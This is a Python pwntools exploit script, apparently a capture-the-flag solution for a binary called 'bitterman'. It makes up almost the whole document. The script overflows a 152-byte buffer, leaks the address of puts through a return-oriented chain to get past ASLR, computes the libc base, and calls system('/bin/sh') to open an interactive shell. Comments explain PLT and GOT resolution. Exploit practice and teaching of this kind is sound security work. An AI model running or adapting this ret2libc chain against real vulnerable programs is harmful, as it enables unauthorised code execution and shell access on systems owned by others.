from pwn import * 

def exploit():
	# STAGE 1
	p = process('./bitterman.dms', env={"LD_PRELOAD":"./libc.so.6"})
	#context(terminal=['tmux', 'new-window'])
	#p = gdb.debug('./bitterman.dms', 'b main')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("[*] Sending Stage 1")

	plt_puts = p64(0x400520)
	got_puts = p64(0x600c50)
	pop_rdi = p64(0x400853)
	main = p64(0x4006ec)
	smash = "A" * 152

	"""
	The .plt section
	The figure below shows the .plt section from the example program. In this case three function stubs reside here, they take the form jmp, push, jmp. Above the stubs a push, jmp sits at the head of the .plt section. Each stub jumps to the address residing at that function's .got.plt entry, which before resolution points straight back into the .plt one instruction below; the push, jmp.
	"""

	"""
	The .got.plt section
	The .got.plt section shown below contains six entries; the first three will in all cases be the address of the program's .dynamic section, the address of the linkmap head and the address of _dl_runtime_resolve_avx(). All entries after these are functions to be resolved at call time.
	"""

	# We call plt_puts to print out got_puts so we can get the real resolved running address of puts to bypass ASLR

	# plt_puts -> jmps to got entry to resolve function.
	# got contains all resolved symbols
	# updating a got entry will result in changing a symbols address (code exection)

	# Move the got_puts into rdi and call plt_puts to print out got_puts and then jmp to main

	payload = str(smash) + str(pop_rdi) + str(got_puts) + str(plt_puts) + str(main)

	p.recvuntil('name?')
	p.sendline("tyler")
	p.recvuntil("message:")
	p.sendline("1024")
	p.recvuntil("text:")
	p.sendline(payload)
	p.recvuntil("Thanks!")
	leaked_puts = p.recv()[:8].strip().ljust(8, str('\x00'))
	log.success("Leaked puts@GLIBC: " + str(leaked_puts))
	leaked_puts = u64(leaked_puts)

	# STAGE 2

	log.success("[*] Sending Stage 2")

	libc_put = 0x6f690
	libc_sys = 0x45390
	libc_sh = 0x18cd57

	offset = leaked_puts - libc_put

	sys = p64(offset + libc_sys)
	sh = p64(offset + libc_sh)

	payload2 = smash + pop_rdi + sh + sys

	p.sendline("tyler")
	p.recvuntil("message:")
	p.sendline("1024")
	p.recvuntil("text:")
	p.sendline(payload2)
	p.recvuntil("Thanks!")
	log.success("[*] Popping Shell")

	p.interactive()

exploit()